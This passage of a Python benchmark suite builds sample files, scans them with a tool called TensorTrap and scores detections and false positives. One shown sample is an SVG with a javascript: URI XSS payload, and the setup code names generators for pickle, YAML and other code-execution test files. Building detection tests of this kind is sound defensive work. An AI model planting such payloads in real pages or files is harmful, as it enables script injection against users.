            "description": "SVG with onclick event handler",
        }

    @staticmethod
    def create_javascript_uri(path: Path) -> dict:
        """SVG with javascript: URI."""
        svg_content = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <a xlink:href="javascript:alert('XSS')">
    <rect width="100" height="100" fill="green"/>
  </a>
</svg>
"""
        with open(path, "w") as f:
            f.write(svg_content)

        return {
            "name": "svg_javascript_uri",
            "file": str(path),
            "cve": None,
            "category": "svg",
            "expected_detection": True,
            "description": "SVG with javascript: URI in link",
        }

    @staticmethod
    def create_benign(path: Path) -> dict:
        """Benign SVG file."""
        svg_content = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="blue"/>
  <text x="50" y="55" text-anchor="middle" fill="white">Safe</text>
</svg>
"""
        with open(path, "w") as f:
            f.write(svg_content)

        return {
            "name": "svg_benign",
            "file": str(path),
            "cve": None,
            "category": "benign",
            "expected_detection": False,
            "description": "Benign SVG image",
        }


class BenignGenerator:
    """Generates benign test cases for false positive testing."""

    @staticmethod
    def create_benign_pickle(path: Path) -> dict:
        """Benign pickle with simple data."""
        data = {
            "model_name": "safe_model",
            "weights": [0.1, 0.2, 0.3, 0.4, 0.5],
            "config": {"layers": 3, "activation": "relu"},
        }
        with open(path, "wb") as f:
            pickle.dump(data, f)

        return {
            "name": "pickle_benign",
            "file": str(path),
            "cve": None,
            "category": "benign",
            "expected_detection": False,
            "description": "Benign pickle with model weights",
        }

    @staticmethod
    def create_benign_pytorch(path: Path) -> dict:
        """Benign PyTorch ZIP archive."""
        data = {"weights": [0.1, 0.2, 0.3]}

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w") as zf:
            pickle_buffer = io.BytesIO()
            pickle.dump(data, pickle_buffer)
            zf.writestr("data.pkl", pickle_buffer.getvalue())

        with open(path, "wb") as f:
            f.write(zip_buffer.getvalue())

        return {
            "name": "pytorch_benign",
            "file": str(path),
            "cve": None,
            "category": "benign",
            "expected_detection": False,
            "description": "Benign PyTorch ZIP archive",
        }


# =============================================================================
# BENCHMARK RUNNER
# =============================================================================


class BenchmarkRunner:
    """Runs TensorTrap benchmarks."""

    def __init__(self, tensortrap_path: str = "tensortrap"):
        self.tensortrap_path = tensortrap_path
        self.results: list[dict] = []

    def run_tensortrap(self, file_path: Path) -> dict:
        """Run TensorTrap on a file."""
        try:
            result = subprocess.run(
                [self.tensortrap_path, "scan", str(file_path)],
                capture_output=True,
                text=True,
                timeout=60,
            )

            output = result.stdout.lower()
            detected = any(
                level in output for level in ["critical", "high", "medium"]
            )

            return {
                "detected": detected,
                "output": result.stdout[:1000],
                "returncode": result.returncode,
            }
        except FileNotFoundError:
            return {"detected": False, "error": "tensortrap not found"}
        except subprocess.TimeoutExpired:
            return {"detected": False, "error": "timeout"}
        except Exception as e:
            return {"detected": False, "error": str(e)}

    def benchmark_file(self, metadata: dict) -> dict:
        """Benchmark a single file."""
        file_path = Path(metadata["file"])
        tt_result = self.run_tensortrap(file_path)

        expected = metadata.get("expected_detection", True)
        detected = tt_result.get("detected", False)

        result = {
            "name": metadata["name"],
            "file": str(file_path),
            "category": metadata.get("category", "unknown"),
            "cve": metadata.get("cve"),
            "description": metadata.get("description", ""),
            "expected": expected,
            "detected": detected,
            "correct": detected == expected,
            "tensortrap": tt_result,
        }

        self.results.append(result)
        return result

    def generate_report(self) -> dict:
        """Generate comprehensive report."""
        total = len(self.results)
        correct = sum(1 for r in self.results if r["correct"])

        # Malicious samples (expected_detection=True)
        malicious = [r for r in self.results if r["expected"]]
        malicious_detected = sum(1 for r in malicious if r["detected"])

        # Benign samples (expected_detection=False)
        benign = [r for r in self.results if not r["expected"]]
        false_positives = sum(1 for r in benign if r["detected"])

        # By category
        categories: dict[str, dict[str, Any]] = {}
        for r in self.results:
            cat = r["category"]
            if cat not in categories:
                categories[cat] = {"total": 0, "correct": 0, "samples": []}
            categories[cat]["total"] += 1
            if r["correct"]:
                categories[cat]["correct"] += 1
            categories[cat]["samples"].append(r)

        # By CVE
        cves: dict[str, dict[str, Any]] = {}
        for r in self.results:
            cve = r.get("cve")
            if cve:
                if cve not in cves:
                    cves[cve] = {"total": 0, "detected": 0, "samples": []}
                cves[cve]["total"] += 1
                if r["detected"]:
                    cves[cve]["detected"] += 1
                cves[cve]["samples"].append(r)

        return {
            "summary": {
                "total_samples": total,
                "accuracy": f"{correct}/{total} ({100*correct/total:.1f}%)" if total else "N/A",
                "malicious_detected": f"{malicious_detected}/{len(malicious)}",
                "false_positives": false_positives,
                "false_negatives": len(malicious) - malicious_detected,
            },
            "by_category": {
                cat: {
                    "accuracy": f"{data['correct']}/{data['total']}",
                    "percentage": f"{100*data['correct']/data['total']:.1f}%"
                    if data["total"]
                    else "N/A",
                }
                for cat, data in categories.items()
            },
            "by_cve": {
                cve: {
                    "detected": f"{data['detected']}/{data['total']}",
                    "percentage": f"{100*data['detected']/data['total']:.1f}%"
                    if data["total"]
                    else "N/A",
                }
                for cve, data in cves.items()
            },
            "detailed_results": self.results,
        }


# =============================================================================
# MAIN FUNCTIONS
# =============================================================================


def setup_environment() -> list[dict]:
    """Set up all test files."""
    print("Setting up comprehensive benchmark environment...")

    # Create directories
    for cat_dir in CATEGORIES.values():
        cat_dir.mkdir(parents=True, exist_ok=True)
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)

    all_metadata: list[dict] = []

    # Pickle bypass tests
    print("\n[1/10] Generating pickle bypass tests...")
    gen = PickleBypassGenerator()
    tests = [
        (gen.create_os_system, "os_system.pkl"),
        (gen.create_subprocess_popen, "subprocess.pkl"),
        (gen.create_eval_exec, "eval_exec.pkl"),
        (gen.create_pip_main_bypass, "pip_main.pkl"),
        (gen.create_runpy_bypass, "runpy.pkl"),
        (gen.create_code_interpreter, "code_interp.pkl"),
        (gen.create_7z_embedded, "7z_embedded.7z"),
        (gen.create_zip_trailing, "zip_trailing.zip"),
        (gen.create_magic_mismatch, "magic_mismatch.png"),
    ]
    for func, filename in tests:
        meta = func(CATEGORIES["pickle_bypass"] / filename)
        all_metadata.append(meta)
        print(f"  Created: {filename}")

    # JFrog zero-day tests
    print("\n[2/10] Generating JFrog zero-day tests...")
    gen = JFrogZeroDayGenerator()
    tests = [
        (gen.create_extension_bypass_bin, "malicious.bin"),
        (gen.create_extension_bypass_pt, "malicious.pt"),
        (gen.create_zip_crc_bypass, "crc_bypass.pt"),
        (gen.create_asyncio_bypass, "asyncio.pkl"),
        (gen.create_internal_module_bypass, "internal.pkl"),
        (gen.create_multiprocessing_bypass, "multiproc.pkl"),
    ]
    for func, filename in tests:
        meta = func(CATEGORIES["jfrog_zeroday"] / filename)
        all_metadata.append(meta)
        print(f"  Created: {filename}")

    # Polyglot tests
    print("\n[3/10] Generating polyglot tests...")
    gen = PolyglotGenerator()
    tests = [
        (gen.create_jpeg_polyglot, "jpeg_polyglot.jpg"),
        (gen.create_double_extension, "model.pkl.png"),
        (gen.create_png_stack, "png_stack.png"),
        (gen.create_pdf_stack, "pdf_stack.pdf"),
    ]
    for func, filename in tests:
        meta = func(CATEGORIES["polyglot"] / filename)
        all_metadata.append(meta)
        print(f"  Created: {filename}")

    # GGUF tests
    print("\n[4/10] Generating GGUF tests...")
    gen = GGUFGenerator()
    meta = gen.create_jinja_injection(CATEGORIES["gguf"] / "jinja_inject.gguf")
    all_metadata.append(meta)
    print("  Created: jinja_inject.gguf")
    meta = gen.create_benign(CATEGORIES["benign"] / "safe.gguf")
    all_metadata.append(meta)
    print("  Created: safe.gguf (benign)")

    # ONNX tests
    print("\n[5/10] Generating ONNX tests...")
    gen = ONNXGenerator()
    meta = gen.create_path_traversal(CATEGORIES["onnx"] / "path_traversal.onnx")
    all_metadata.append(meta)
    print("  Created: path_traversal.onnx")
    meta = gen.create_arbitrary_file_read(CATEGORIES["onnx"] / "file_read.onnx")
    all_metadata.append(meta)
    print("  Created: file_read.onnx")
    meta = gen.create_benign(CATEGORIES["benign"] / "safe.onnx")
    all_metadata.append(meta)
    print("  Created: safe.onnx (benign)")

    # YAML tests
    print("\n[6/10] Generating YAML tests...")
    gen = YAMLGenerator()
    meta = gen.create_unsafe_deserialization(CATEGORIES["yaml"] / "unsafe_deser.yaml")
    all_metadata.append(meta)
    print("  Created: unsafe_deser.yaml")
    meta = gen.create_python_exec(CATEGORIES["yaml"] / "python_exec.yaml")
    all_metadata.append(meta)
    print("  Created: python_exec.yaml")
    meta = gen.create_benign(CATEGORIES["benign"] / "safe.yaml")
    all_metadata.append(meta)
    print("  Created: safe.yaml (benign)")

    # ComfyUI tests
    print("\n[7/10] Generating ComfyUI tests...")
    gen = ComfyUIGenerator()
    meta = gen.create_ace_expression_eval(CATEGORIES["comfyui"] / "ace_eval.json")
    all_metadata.append(meta)
    print("  Created: ace_eval.json")
    meta = gen.create_hue_adjust(CATEGORIES["comfyui"] / "hue_adjust.json")
    all_metadata.append(meta)
    print("  Created: hue_adjust.json")
    meta = gen.create_benign(CATEGORIES["benign"] / "safe_workflow.json")
    all_metadata.append(meta)
    print("  Created: safe_workflow.json (benign)")

    # Keras tests
    print("\n[8/10] Generating Keras/HDF5 tests...")
    gen = KerasGenerator()
    meta = gen.create_lambda_layer(CATEGORIES["keras"] / "lambda_layer.h5")
    all_metadata.append(meta)
    print("  Created: lambda_layer.h5")
    meta = gen.create_embedded_pickle(CATEGORIES["keras"] / "embedded_pickle.h5")
    all_metadata.append(meta)
    print("  Created: embedded_pickle.h5")
    meta = gen.create_benign(CATEGORIES["benign"] / "safe.h5")
    all_metadata.append(meta)
    print("  Created: safe.h5 (benign)")

    # Safetensors tests
    print("\n[9/10] Generating Safetensors tests...")
    gen = SafetensorsGenerator()
    meta = gen.create_oversized_header(CATEGORIES["safetensors"] / "oversized.safetensors")
    all_metadata.append(meta)
    print("  Created: oversized.safetensors")
    meta = gen.create_embedded_payload(CATEGORIES["safetensors"] / "payload.safetensors")
    all_metadata.append(meta)
    print("  Created: payload.safetensors")
    meta = gen.create_pickle_in_metadata(CATEGORIES["safetensors"] / "pickle_meta.safetensors")
    all_metadata.append(meta)
    print("  Created: pickle_meta.safetensors")
    meta = gen.create_benign(CATEGORIES["benign"] / "safe.safetensors")
    all_metadata.append(meta)
    print("  Created: safe.safetensors (benign)")

    # SVG tests
    print("\n[10/10] Generating SVG tests...")
    gen = SVGGenerator()
    meta = gen.create_script_injection(CATEGORIES["svg"] / "script_inject.svg")
    all_metadata.append(meta)
    print("  Created: script_inject.svg")
    meta = gen.create_onclick_handler(CATEGORIES["svg"] / "onclick.svg")
    all_metadata.append(meta)
    print("  Created: onclick.svg")
    meta = gen.create_javascript_uri(CATEGORIES["svg"] / "js_uri.svg")
    all_metadata.append(meta)
    print("  Created: js_uri.svg")
    meta = gen.create_benign(CATEGORIES["benign"] / "safe.svg")
    all_metadata.append(meta)
    print("  Created: safe.svg (benign)")

    # Additional benign samples
    print("\n[Bonus] Generating additional benign samples...")
    gen = BenignGenerator()
    meta = gen.create_benign_pickle(CATEGORIES["benign"] / "benign.pkl")
    all_metadata.append(meta)
    print("  Created: benign.pkl")
    meta = gen.create_benign_pytorch(CATEGORIES["benign"] / "benign.pt")
    all_metadata.append(meta)
    print("  Created: benign.pt")

    # Save metadata
    metadata_path = BENCHMARK_DIR / "metadata.json"
    with open(metadata_path, "w") as f:
        json.dump(all_metadata, f, indent=2)

    malicious_count = sum(1 for m in all_metadata if m.get("expected_detection", True))
    benign_count = len(all_metadata) - malicious_count

    print(f"\n{'='*60}")
    print(f"Setup complete!")
    print(f"  Total samples: {len(all_metadata)}")
    print(f"  Malicious: {malicious_count}")
    print(f"  Benign: {benign_count}")
    print(f"  Metadata: {metadata_path}")
    print(f"{'='*60}")

    return all_metadata


def run_benchmarks(tensortrap_path: str = "tensortrap") -> dict:
    """Run all benchmarks."""
    print("Running comprehensive benchmarks...")

    metadata_path = BENCHMARK_DIR / "metadata.json"
    if not metadata_path.exists():
        print("No test files found. Run with --setup first.")
        return {}

    with open(metadata_path) as f:
        all_metadata = json.load(f)

    runner = BenchmarkRunner(tensortrap_path)

    for i, meta in enumerate(all_metadata, 1):
        print(f"  [{i}/{len(all_metadata)}] Testing: {meta['name']}...")
        runner.benchmark_file(meta)

    report = runner.generate_report()

    # Save report
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_path = RESULTS_DIR / f"comprehensive_report_{timestamp}.json"
    with open(report_path, "w") as f:
        json.dump(report, f, indent=2)

    print(f"\nReport saved: {report_path}")
    return report


def print_report(report: dict) -> None:
    """Print formatted report."""
    print("\n" + "=" * 70)
    print("TENSORTRAP COMPREHENSIVE BENCHMARK REPORT")
    print("=" * 70)

    summary = report.get("summary", {})
    print(f"\nOVERALL ACCURACY: {summary.get('accuracy', 'N/A')}")
    print(f"  Malicious detected: {summary.get('malicious_detected', 'N/A')}")
    print(f"  False positives: {summary.get('false_positives', 0)}")
    print(f"  False negatives: {summary.get('false_negatives', 0)}")

    print("\n" + "-" * 70)
    print("DETECTION BY CATEGORY")
    print("-" * 70)
    for cat, data in report.get("by_category", {}).items():
        print(f"  {cat:20} {data['accuracy']:10} ({data['percentage']})")

    print("\n" + "-" * 70)
    print("DETECTION BY CVE")
    print("-" * 70)
    for cve, data in report.get("by_cve", {}).items():
        print(f"  {cve:20} {data['detected']:10} ({data['percentage']})")

    # Detailed failures
    print("\n" + "-" * 70)
    print("FAILURES (if any)")
    print("-" * 70)
    failures = [r for r in report.get("detailed_results", []) if not r.get("correct")]
    if failures:
        for f in failures:
            status = "FP" if f["detected"] and not f["expected"] else "FN"
            print(f"  [{status}] {f['name']}: {f['description']}")
    else:
        print("  None! All tests passed.")

    print("\n" + "=" * 70)


def main():
    parser = argparse.ArgumentParser(
        description="TensorTrap Comprehensive Benchmark Suite"
    )
    parser.add_argument("--setup", action="store_true", help="Generate test files")
    parser.add_argument("--run", action="store_true", help="Run benchmarks")
    parser.add_argument("--report", action="store_true", help="Show latest report")
    parser.add_argument("--all", action="store_true", help="Setup + run + report")
    parser.add_argument(
        "--tensortrap", default="tensortrap", help="Path to TensorTrap"
    )

    args = parser.parse_args()

    if args.all:
        args.setup = args.run = args.report = True

    if args.setup:
        setup_environment()

    if args.run:
        report = run_benchmarks(args.tensortrap)
        if report:
            print_report(report)

    if args.report and not args.run:
        # Find latest report
        reports = list(RESULTS_DIR.glob("comprehensive_report_*.json"))
        if reports:
            latest = max(reports, key=lambda p: p.stat().st_mtime)
            with open(latest) as f:
                report = json.load(f)
            print_report(report)
        else:
            print("No reports found. Run with --run first.")

    if not any([args.setup, args.run, args.report, args.all]):
        parser.print_help()


if __name__ == "__main__":
    main()
